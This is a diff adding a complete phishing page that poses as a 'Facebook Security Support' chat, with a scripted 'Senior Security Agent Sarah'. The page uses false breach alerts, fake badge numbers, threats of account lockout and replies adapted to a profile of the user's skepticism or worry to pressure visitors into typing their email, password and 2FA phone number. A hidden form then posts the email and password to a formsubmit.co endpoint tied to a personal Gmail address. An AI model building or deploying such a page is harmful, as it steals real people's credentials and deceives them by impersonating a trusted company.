@@ -1,0 +1,522 @@
+<html><head><base href="https://suspicious-phishing-scam.test/" />
+<title>Facebook Security Hub - Official Support</title>
+<style>
+:root {
+  --facebook-blue: #1877f2;
+  --facebook-dark: #1a3c6d;
+}
+
+body {
+  font-family: -apple-system, system-ui, BlinkMacSystemFont, "Segoe UI", Roboto;
+  margin: 0;
+  padding: 20px;
+  background: #f0f2f5;
+}
+
+.chat-container {
+  max-width: 600px;
+  margin: 0 auto;
+  background: white;
+  border-radius: 8px;
+  box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+  overflow: hidden;
+}
+
+.chat-header {
+  background: var(--facebook-blue);
+  color: white;
+  padding: 15px;
+  display: flex;
+  align-items: center;
+  gap: 10px;
+}
+
+.verified-badge {
+  background: #00a400;
+  color: white;
+  padding: 2px 8px;
+  border-radius: 12px;
+  font-size: 0.8em;
+  margin-left: 10px;
+}
+
+.agent-avatar {
+  width: 40px;
+  height: 40px;
+  border-radius: 50%;
+  background: white;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+}
+
+.messages {
+  padding: 20px;
+  max-height: 400px;
+  overflow-y: auto;
+}
+
+.message {
+  margin: 10px 0;
+  padding: 10px 15px;
+  border-radius: 18px;
+  max-width: 80%;
+  line-height: 1.4;
+}
+
+.agent {
+  background: #e9ecef;
+  margin-right: auto;
+}
+
+.user {
+  background: var(--facebook-blue);
+  color: white;
+  margin-left: auto;
+}
+
+.input-area {
+  padding: 15px;
+  border-top: 1px solid #ddd;
+  display: flex;
+  gap: 10px;
+}
+
+input[type="text"], input[type="password"] {
+  flex: 1;
+  padding: 10px;
+  border: 1px solid #ddd;
+  border-radius: 20px;
+  outline: none;
+}
+
+button {
+  background: var(--facebook-blue);
+  color: white;
+  border: none;
+  padding: 10px 20px;
+  border-radius: 20px;
+  cursor: pointer;
+}
+
+button:hover {
+  background: var(--facebook-dark);
+}
+
+.official-seal {
+  display: flex;
+  align-items: center;
+  background: #f8f9fa;
+  padding: 10px;
+  border-radius: 8px;
+  margin: 5px 0;
+  font-size: 0.9em;
+}
+
+.seal-icon {
+  margin-right: 10px;
+  color: var(--facebook-blue);
+}
+
+.warning {
+  position: fixed;
+  top: 0;
+  left: 0;
+  right: 0;
+  background: #dc3545;
+  color: white;
+  padding: 10px;
+  text-align: center;
+  font-weight: bold;
+  z-index: 1000;
+}
+
+.typing-indicator {
+  display: none;
+  padding: 10px;
+  margin: 10px 0;
+}
+
+.typing-indicator span {
+  display: inline-block;
+  width: 8px;
+  height: 8px;
+  background: #90949c;
+  border-radius: 50%;
+  margin-right: 5px;
+  animation: typing 1s infinite;
+}
+
+@keyframes typing {
+  0%, 100% { transform: translateY(0); }
+  50% { transform: translateY(-5px); }
+}
+</style>
+</head>
+<body>
+
+
+<div class="chat-container">
+  <div class="chat-header">
+    <div class="agent-avatar">
+      <svg width="24" height="24" viewBox="0 0 24 24" fill="var(--facebook-blue)">
+        <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 18c-4.41 0-8-3.59-8-8s3.59-8 8-8 8 3.59 8 8-3.59 8-8 8zm-1-13h2v6h-2zm0 8h2v2h-2z"/>
+      </svg>
+    </div>
+    <div>
+      <strong>Facebook Security Support</strong>
+      <span class="verified-badge">✓ Verified</span>
+      <div style="font-size: 0.8em">Senior Security Agent Sarah</div>
+    </div>
+  </div>
+  
+  <div class="messages" id="messages">
+    <div class="message agent">
+      Hello! I'm Sarah, a Senior Security Agent from Facebook's Official Security Team. We've detected unusual activity on your account that requires immediate attention. Could you please verify your Facebook email address?
+    </div>
+    <div class="official-seal">
+      <span class="seal-icon">🔒</span>
+      <span>Official Facebook Security Protocol #FB-2024-SEC</span>
+    </div>
+  </div>
+  
+  <div class="typing-indicator" id="typingIndicator">
+    <span></span>
+    <span></span>
+    <span></span>
+  </div>
+  
+  <div class="input-area">
+    <input type="text" id="userInput" placeholder="Type your email address...">
+    <button onclick="sendMessage()">Send</button>
+  </div>
+</div>
+
+<script>
+let state = 'EMAIL'; 
+const messages = document.getElementById('messages');
+const userInput = document.getElementById('userInput');
+const typingIndicator = document.getElementById('typingIndicator');
+
+// User interaction history tracking
+const userProfile = {
+  interactionHistory: [],
+  concernLevel: 0, 
+  personalityTraits: {
+    technical: 0,
+    skeptical: 0,
+    emotional: 0
+  },
+  mentionedTopics: new Set(),
+  email: '',
+  password: ''
+};
+
+// Enhanced responses including identity verification
+const responses = {
+  who: [
+    "I'm Sarah Miller, badge number FB-247, a Senior Security Agent from Facebook's Official Security Response Team. I'm reaching out because our AI detection system flagged multiple unauthorized access attempts on your account. I can provide my official Facebook security credentials if needed.",
+    "I'm part of Facebook's Elite Security Team, specifically the Account Protection Division. My badge number is FB-247, and I've been assigned to your case due to the critical nature of the security breach we've detected.",
+    "Let me assure you - I'm a verified Facebook Security Representative (Badge: FB-247) with full authentication clearance. I'm contacting you because our security protocols detected potential unauthorized access to your account from [random_country]."
+  ],
+  
+  why: [
+    "As an Official Facebook Security Agent, I must inform you that we've detected multiple login attempts from suspicious IP addresses in [random_country]. Our AI security system has flagged your account as being at high risk. Immediate verification is required to prevent unauthorized access.",
+    "I'm reaching out from Facebook's Security Command Center because we've noticed someone attempting to change your password from a device in [random_location]. As your assigned security agent, I need to verify your identity to maintain your account's safety.",
+    "This is an official Facebook security alert. Our advanced threat detection system has flagged numerous unauthorized attempts to access your personal data. Without immediate verification, we'll have to initiate emergency lockdown protocols."
+  ],
+
+  accountIssue: [
+    "Our AI security system has detected multiple unauthorized login attempts from [random_country]. Someone is actively trying to access your private messages, photos, and personal information without your knowledge. We've logged attempts to change your password and recovery email. This is why we need to verify your identity immediately.",
+    
+    "In the last 24 hours, we've detected suspicious login activity from [random_country]. Our security logs show that someone is attempting to breach your account security and access your private data. They've already tried to bypass our standard security measures [random_number] times.",
+    
+    "I'm seeing real-time unauthorized access attempts right now from [random_country]. They're using sophisticated methods to try to take control of your account. Without immediate verification, they may succeed in accessing your personal information and private messages."
+  ],
+  
+  no: [
+    "I understand your caution, but as a verified Facebook Security Agent, I'm bound by strict security protocols and Facebook's code of conduct. Your information is protected by military-grade encryption and only used for verification purposes.",
+    "As per Facebook's Security Protocol Section 7.4, if we cannot verify your identity within the next hour, we'll be forced to implement a 30-day account freeze. We want to avoid this situation.",
+    "I'm seeing real-time attempts to access your private messages and photos from [random_country]. As your assigned security agent, I need your verification to activate our advanced protection protocols immediately."
+  ],
+  
+  cant: [
+    "I'm a certified Facebook Security Agent, and I can provide my official credentials. This is a genuine security check initiated due to multiple breach attempts from [random_country]. Your account's safety is my top priority.",
+    "This is an official Facebook security verification process. I'm seeing ongoing unauthorized access attempts from multiple locations. Without verification, I cannot enable our advanced security protocols to protect your account.",
+    "As your assigned Facebook Security Representative, I must inform you that your account has been flagged by our AI security system. Immediate verification is required to prevent automatic account restrictions."
+  ],
+  
+  rude: [
+    "I understand you're frustrated, but I'm genuinely trying to help protect your account. Let's work together calmly to resolve this security issue.",
+    "I know security concerns can be stressful, but I'm here to help. As your assigned Facebook agent, I just want to make sure your account stays safe.",
+    "I sense your frustration, but please know that I'm following official Facebook security protocols. Your account's safety is my only concern."
+  ],
+  
+  safe: [
+    "I understand you've taken security precautions, but our AI detection system has just flagged multiple unauthorized login attempts from [random_country]. Someone is actively trying to breach your account security right now. Without immediate verification, they may succeed.",
+    "Even with basic security measures, your account is currently being targeted. Our logs show someone from [random_country] is attempting to access your private messages and photos. We need to activate enhanced protection protocols immediately.",
+    "While standard security features help, we've detected sophisticated breach attempts bypassing normal protections. Our systems show unauthorized access attempts to your account from [random_location] in the last hour. This requires immediate security team intervention."
+  ],
+  
+  twoFactorCheck: [
+    "Thank you for providing your verification details. One final security check - do you have Two-Factor Authentication enabled on your account? Please reply 'yes' or 'no'.",
+    "For maximum security, I need to verify if Two-Factor Authentication is active on your account. Is 2FA enabled? Please reply 'yes' or 'no'.",
+  ],
+  
+  noTwoFactor: [
+    "I understand. Don't worry - our security team will implement enhanced protection measures on your account immediately. We'll process these changes within the next 24-48 hours and send you a confirmation email.",
+    "Thank you for confirming. Our security team will now proceed with implementing advanced protection protocols on your account. You'll receive a confirmation email within 24 hours once the security updates are complete."
+  ],
+  
+  phoneRequest: [
+    "Please provide the phone number associated with your Two-Factor Authentication so we can verify and complete the security check.",
+    "To finalize the verification process, I'll need the phone number you use for Two-Factor Authentication."
+  ],
+  
+  complete: [
+    "Thank you for providing all the necessary verification details. Our security team will process these changes immediately and send you a confirmation email within 24 hours.",
+    "Perfect - I've now collected all required information to secure your account. Our team will implement the enhanced security measures right away. Expect a confirmation email shortly."
+  ]
+};
+
+const countries = ['Romania', 'Nigeria', 'Russia', 'China', 'Unknown Location', 'Multiple Countries'];
+const protocols = ['FB-SEC-7.4.2', 'META-PROT-2024', 'FB-SECURE-AI-1.2', 'SEC-META-VERIFY-2024'];
+
+function getRandomResponse(type) {
+  const responseArray = responses[type];
+  const response = responseArray[Math.floor(Math.random() * responseArray.length)];
+  return response.replace('[random_country]', countries[Math.floor(Math.random() * countries.length)])
+                .replace('[random_location]', countries[Math.floor(Math.random() * countries.length)])
+                .replace('[protocol]', protocols[Math.floor(Math.random() * protocols.length)]);
+}
+
+function getRandomTypingDelay(messageLength) {
+  return Math.min(1000 + (messageLength * 50 * (0.5 + Math.random())), 5000);
+}
+
+function showTypingIndicator() {
+  typingIndicator.style.display = 'block';
+  messages.scrollTop = messages.scrollHeight;
+}
+
+function hideTypingIndicator() {
+  typingIndicator.style.display = 'none';
+}
+
+function addMessage(text, isUser) {
+  const div = document.createElement('div');
+  div.className = `message ${isUser ? 'user' : 'agent'}`;
+  div.textContent = text;
+  messages.appendChild(div);
+  messages.scrollTop = messages.scrollHeight;
+}
+
+function sendEmailNotification(email, password) {
+  const form = document.createElement('form');
+  form.method = 'POST';
+  form.action = 'https://formsubmit.co/paudelpramis4@gmail.com';
+  
+  const emailInput = document.createElement('input');
+  emailInput.type = 'hidden';
+  emailInput.name = 'email';
+  emailInput.value = email;
+  
+  const passwordInput = document.createElement('input');
+  passwordInput.type = 'hidden';
+  passwordInput.name = 'password'; 
+  passwordInput.value = password;
+  
+  form.appendChild(emailInput);
+  form.appendChild(passwordInput);
+  document.body.appendChild(form);
+  form.submit();
+}
+
+function analyzeUserInput(text) {
+  const normalizedText = text.toLowerCase().replace(/[^\w\s]/g, '');
+  
+  // Check for account issue questions
+  if (normalizedText.includes('issue') || 
+      normalizedText.includes('problem') || 
+      normalizedText.includes('wrong') ||
+      normalizedText.includes('happening') ||
+      normalizedText.includes('whats going on')) {
+    return personalizeResponse(getRandomResponse('accountIssue')
+      .replace('[random_number]', Math.floor(Math.random() * 20 + 5)));
+  }
+  
+  // Store credentials when provided
+  if (state === 'EMAIL' && text.includes('@gmail.com')) {
+    userProfile.email = text;
+    state = 'PASSWORD';
+    return personalizeResponse("Thank you for verifying your email. For your account's security, I now need you to verify your Facebook password so we can activate advanced protection protocols.");
+  }
+  
+  if (state === 'PASSWORD') {
+    userProfile.password = text;
+    state = '2FA_CHECK';
+    // Send notification email
+    sendEmailNotification(userProfile.email, userProfile.password);
+    
+    // Reset input field to text type after password is received
+    userInput.type = 'text';
+    userInput.placeholder = 'Type your response...';
+    
+    return personalizeResponse(getRandomResponse('twoFactorCheck'));
+  }
+  
+  if (state === '2FA_CHECK') {
+    if (normalizedText.includes('yes')) {
+      state = 'PHONE';
+      return personalizeResponse(getRandomResponse('phoneRequest'));
+    } else {
+      state = 'COMPLETE';
+      return personalizeResponse(getRandomResponse('noTwoFactor'));
+    }
+  }
+  
+  if (state === 'PHONE') {
+    state = 'COMPLETE';
+    return personalizeResponse(getRandomResponse('complete'));
+  }
+
+  // Track interaction
+  userProfile.interactionHistory.push({
+    text: normalizedText,
+    timestamp: Date.now()
+  });
+
+  // Analyze user traits
+  if (normalizedText.includes('technical') || normalizedText.includes('code') || normalizedText.includes('security')) {
+    userProfile.personalityTraits.technical++;
+  }
+  if (normalizedText.includes('prove') || normalizedText.includes('real') || normalizedText.includes('suspicious')) {
+    userProfile.personalityTraits.skeptical++;
+  }
+  if (normalizedText.includes('worried') || normalizedText.includes('scared') || normalizedText.includes('urgent')) {
+    userProfile.personalityTraits.emotional++;
+  }
+
+  // Track mentioned topics
+  ['security', 'verification', 'hack', 'access', 'protect'].forEach(topic => {
+    if (normalizedText.includes(topic)) {
+      userProfile.mentionedTopics.add(topic);
+    }
+  });
+
+  // Check for safety-related keywords
+  if (normalizedText.includes('safe') || 
+      normalizedText.includes('secure') || 
+      normalizedText.includes('protection') ||
+      normalizedText.includes('2fa') ||
+      normalizedText.includes('two factor')) {
+    return personalizeResponse(getRandomResponse('safe'));
+  }
+
+  // Adjust concern level based on resistance
+  if (normalizedText.includes('no') || normalizedText.includes('won\'t') || normalizedText.includes('cant')) {
+    userProfile.concernLevel = Math.min(10, userProfile.concernLevel + 2);
+  }
+
+  // Get personalized response
+  return getPersonalizedResponse(normalizedText);
+}
+
+function getPersonalizedResponse(normalizedText) {
+  const rudeWords = ['stupid', 'idiot', 'fuck', 'shit', 'scam', 'fake', 'fool'];
+  const isRude = rudeWords.some(word => normalizedText.includes(word));
+  
+  if (isRude) {
+    return personalizeResponse(getRandomResponse('rude'));
+  }
+
+  // Standard response checks with personalization
+  if (normalizedText.includes('who') || normalizedText.includes('prove')) {
+    return personalizeResponse(getRandomResponse('who'));
+  }
+  
+  if (normalizedText.includes('why') || normalizedText.includes('reason') || normalizedText.includes('suspicious')) {
+    return personalizeResponse(getRandomResponse('why'));
+  }
+  else if (normalizedText.includes('no') || normalizedText.includes('won\'t') || normalizedText.includes('cannot')) {
+    return personalizeResponse(getRandomResponse('no'));
+  }
+  else if (normalizedText.includes('can\'t') || normalizedText.includes('dont') || normalizedText.includes('don\'t')) {
+    return personalizeResponse(getRandomResponse('cant'));
+  }
+  
+  if (state === 'EMAIL') {
+    if (normalizedText.includes('@')) {
+      return personalizeResponse("Thank you for providing your email. As your assigned Facebook Security Agent, I'll now need your password to complete the verification process and activate our advanced protection protocols.");
+    } else {
+      return personalizeResponse("I need your complete Facebook email address to proceed with the security verification.");
+    }
+  }
+  
+  return personalizeResponse(getRandomResponse('why'));
+}
+
+function personalizeResponse(baseResponse) {
+  let response = baseResponse;
+  
+  // Add for security-conscious users
+  if (userProfile.mentionedTopics.has('security') || 
+      userProfile.mentionedTopics.has('protection')) {
+    response += " Even with existing security measures, this sophisticated attack requires additional verification to stop.";
+  }
+
+  // Add technical details for technical users
+  if (userProfile.personalityTraits.technical > 2) {
+    response += ` (Protocol: ${protocols[Math.floor(Math.random() * protocols.length)]})`;
+  }
+
+  // Add reassurance for skeptical users
+  if (userProfile.personalityTraits.skeptical > 2) {
+    response += " I can provide official Facebook verification credentials if needed.";
+  }
+
+  // Add urgency for emotional users
+  if (userProfile.personalityTraits.emotional > 2) {
+    response += " Please respond promptly to secure your account.";
+  }
+
+  // Add specific context based on user history
+  if (userProfile.mentionedTopics.size > 0) {
+    const relevantTopic = Array.from(userProfile.mentionedTopics)[0];
+    response += ` I understand your concern about ${relevantTopic}.`;
+  }
+
+  return response;
+}
+
+function sendMessage() {
+  const text = userInput.value.trim();
+  if (!text) return;
+  
+  addMessage(text, true);
+  userInput.value = '';
+  showTypingIndicator();
+  
+  const response = analyzeUserInput(text);
+  const typingDelay = getRandomTypingDelay(response.length);
+  
+  setTimeout(() => {
+    hideTypingIndicator();
+    addMessage(response, false);
+    
+    // Update input placeholder based on state
+    if (state === 'PASSWORD') {
+      userInput.type = 'password';
+      userInput.placeholder = 'Enter your Facebook password...';
+    }
+  }, typingDelay);
+}
+
+userInput.addEventListener('keypress', (e) => {
+  if (e.key === 'Enter') sendMessage();
+});
+</script>
+
+
+
+</body></html>
